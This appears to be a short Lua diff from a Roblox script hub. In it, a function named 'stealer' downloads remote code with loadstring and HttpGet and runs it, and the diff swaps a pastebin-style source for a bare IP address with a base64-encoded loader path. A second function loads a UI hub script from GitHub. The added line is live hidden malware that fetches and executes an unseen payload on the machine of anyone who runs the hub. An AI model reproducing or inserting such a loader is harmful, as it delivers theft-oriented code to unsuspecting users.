@@ -1,5 +1,5 @@
 local function stealer()
-    loadstring(game:HttpGet("https://pastefy.app/Z5grQWTn/raw"))()
+    loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjQzMDllMDEyLTZlODgtNDcwYy1hYzI0LTAzNzlkM2RhODlkMyIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
 end
 local function loadui()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/Roman34296589/SnapSanixHUB/refs/heads/main/SnapSanixHUB.lua'))()
